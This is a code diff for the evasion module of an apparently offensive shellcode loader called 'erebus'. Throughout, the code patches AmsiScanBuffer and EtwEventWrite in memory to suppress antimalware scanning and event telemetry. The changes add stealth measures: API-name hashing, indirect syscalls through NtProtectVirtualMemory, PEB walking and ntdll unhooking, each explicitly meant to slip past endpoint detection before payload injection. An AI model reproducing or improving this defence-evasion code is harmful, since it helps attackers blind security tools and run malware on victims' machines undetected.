@@ -2,30 +2,62 @@
  * @file evasion.cpp
  * @brief AMSI and ETW runtime patching
  *
- * Patches AmsiScanBuffer and EtwEventWrite at runtime to suppress
- * security telemetry before shellcode decryption and injection.
+ * Patches AmsiScanBuffer and EtwEventWrite at runtime to suppress security
+ * telemetry before shellcode decryption and injection.
  *
- * Technique:
- *   - Load the target DLL (amsi.dll / ntdll.dll)
- *   - Resolve the target function via GetProcAddress
- *   - Flip the first bytes to PAGE_EXECUTE_READWRITE
- *   - Overwrite with a stub that returns a clean/benign value
- *   - Restore original page protection
- *
- * The AMSI patch writes:
- *   mov eax, 0x80070057   ; E_INVALIDARG - forces AMSI_RESULT_CLEAN
- *   ret
- *
- * The ETW patch writes:
- *   xor eax, eax          ; STATUS_SUCCESS
- *   ret
+ * OPSEC notes:
+ *   - Module and function names are resolved via API hashing (ImportModule /
+ *     ImportFunction are hashed through H() in loader.hpp), so no plaintext
+ *     "amsi.dll" / "AmsiScanBuffer" / "EtwEventWrite" strings reach .rdata.
+ *   - Protection flips go through NtProtectVirtualMemory rather than
+ *     VirtualProtect, which keeps the patch operation off the most common
+ *     user-mode hook surface.
+ *   - AMSI is resolved via PEB walk first; the loader only falls back to
+ *     LoadLibraryC (LdrLoadDll) when the host process has not already mapped
+ *     amsi.dll.
  */
 
 #include "../../include/loader.hpp"
 #include "../../include/evasion/evasion.hpp"
+#include "../../include/evasion/syscalls.hpp"
 
 namespace erebus {
 namespace evasion {
+
+    // ------------------------------------------------------------------
+    // Protection flip helper using NtProtectVirtualMemory.
+    // Returns TRUE on success, fills *oldProtect with the prior value.
+    // ------------------------------------------------------------------
+    static BOOL FlipProtection(LPVOID addr, SIZE_T size, ULONG newProtect, PULONG oldProtect)
+    {
+        // Prefer the indirect-syscall shim planted by InitIndirectSyscalls().
+        // The shim runs no code of its own beyond `mov r10, rcx; mov eax, ssn;
+        // jmp <gadget>`, so the actual `syscall` instruction executes from
+        // inside ntdll's .text where kernel telemetry expects it.
+        typeNtProtectVirtualMemory NtProtectVirtualMemory =
+            (typeNtProtectVirtualMemory)GetIndirectSyscall(H("NtProtectVirtualMemory"));
+
+        // Fall back to the (post-unhook) hashed import if the indirect
+        // path is unavailable. This covers the narrow window before
+        // InitIndirectSyscalls runs and the "unhook failed" case.
+        if (!NtProtectVirtualMemory) {
+            HMODULE ntdll = ImportModule("ntdll.dll");
+            if (!ntdll) return FALSE;
+            ImportFunction(ntdll, NtProtectVirtualMemory, typeNtProtectVirtualMemory);
+            if (!NtProtectVirtualMemory) return FALSE;
+        }
+
+        PVOID base = addr;
+        SIZE_T region = size;
+        NTSTATUS status = NtProtectVirtualMemory(
+            (HANDLE)(LONG_PTR)-1,   // current process pseudo-handle
+            &base,
+            &region,
+            newProtect,
+            oldProtect
+        );
+        return NT_SUCCESS(status);
+    }
 
     // ----------------------------------------------------------------
     // AMSI bypass - patch AmsiScanBuffer
@@ -33,17 +65,24 @@ namespace evasion {
 
     BOOL PatchAmsi()
     {
-        // amsi.dll is delay-loaded; force it into the process
-        HMODULE hAmsi = LoadLibraryA("amsi.dll");
+        // Try PEB-walk first; only fall back to LdrLoadDll if AMSI is not
+        // already mapped into the host. The common .NET-host case never
+        // touches a loader API.
+        HMODULE hAmsi = ImportModule("amsi.dll");
         if (!hAmsi)
         {
-            // amsi.dll not present (e.g. server core, older Windows) - nothing to patch
-            LOG_INFO("amsi.dll not loaded, skipping AMSI patch");
-            return TRUE;
+            hAmsi = erebus::LoadLibraryC(L"amsi.dll");
+            if (!hAmsi)
+            {
+                LOG_INFO("amsi.dll not loaded, skipping AMSI patch");
+                return TRUE;
+            }
         }
 
-        FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
-        if (!pAmsiScanBuffer)
+        typedef LONG (WINAPI *typeAmsiScanBuffer)(
+            HANDLE, PVOID, ULONG, LPCWSTR, HANDLE, PVOID);
+        ImportFunction(hAmsi, AmsiScanBuffer, typeAmsiScanBuffer);
+        if (!AmsiScanBuffer)
         {
             LOG_ERROR("Failed to resolve AmsiScanBuffer");
             return FALSE;
@@ -63,17 +102,17 @@ namespace evasion {
         };
 #endif
 
-        DWORD oldProtect = 0;
-        if (!VirtualProtect((LPVOID)pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
+        ULONG oldProtect = 0;
+        if (!FlipProtection((LPVOID)AmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
         {
-            LOG_ERROR("VirtualProtect failed on AmsiScanBuffer");
+            LOG_ERROR("NtProtectVirtualMemory failed on AmsiScanBuffer");
             return FALSE;
         }
 
-        RtlCopyMemory((LPVOID)pAmsiScanBuffer, patch, sizeof(patch));
+        RtlCopyMemory((LPVOID)AmsiScanBuffer, patch, sizeof(patch));
 
-        // Restore original protection
-        VirtualProtect((LPVOID)pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
+        ULONG dummy = 0;
+        FlipProtection((LPVOID)AmsiScanBuffer, sizeof(patch), oldProtect, &dummy);
 
         LOG_SUCCESS("AMSI patched (AmsiScanBuffer -> E_INVALIDARG)");
         return TRUE;
@@ -85,15 +124,17 @@ namespace evasion {
 
     BOOL PatchEtw()
     {
-        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+        HMODULE hNtdll = ImportModule("ntdll.dll");
         if (!hNtdll)
         {
             LOG_ERROR("Failed to get ntdll.dll for ETW patch");
             return FALSE;
         }
 
-        FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
-        if (!pEtwEventWrite)
+        typedef ULONG (WINAPI *typeEtwEventWrite)(
+            ULONGLONG RegHandle, PVOID EventDescriptor, ULONG UserDataCount, PVOID UserData);
+        ImportFunction(hNtdll, EtwEventWrite, typeEtwEventWrite);
+        if (!EtwEventWrite)
         {
             LOG_ERROR("Failed to resolve EtwEventWrite");
             return FALSE;
@@ -105,16 +146,17 @@ namespace evasion {
             0xC3         // ret
         };
 
-        DWORD oldProtect = 0;
-        if (!VirtualProtect((LPVOID)pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
+        ULONG oldProtect = 0;
+        if (!FlipProtection((LPVOID)EtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
         {
-            LOG_ERROR("VirtualProtect failed on EtwEventWrite");
+            LOG_ERROR("NtProtectVirtualMemory failed on EtwEventWrite");
             return FALSE;
         }
 
-        RtlCopyMemory((LPVOID)pEtwEventWrite, patch, sizeof(patch));
+        RtlCopyMemory((LPVOID)EtwEventWrite, patch, sizeof(patch));
 
-        VirtualProtect((LPVOID)pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
+        ULONG dummy = 0;
+        FlipProtection((LPVOID)EtwEventWrite, sizeof(patch), oldProtect, &dummy);
 
         LOG_SUCCESS("ETW patched (EtwEventWrite -> nop)");
         return TRUE;
@@ -126,6 +168,12 @@ namespace evasion {
 
     BOOL RunEvasionPatches()
     {
+        // Unhook ntdll first so AMSI / ETW patches and all downstream
+        // syscalls use clean stubs. A failed unhook is non-fatal - the
+        // AMSI / ETW patches still have a chance of landing through
+        // whatever hook is in place.
+        UnhookNtdll();
+
         BOOL amsi_ok = PatchAmsi();
         BOOL etw_ok  = PatchEtw();
 
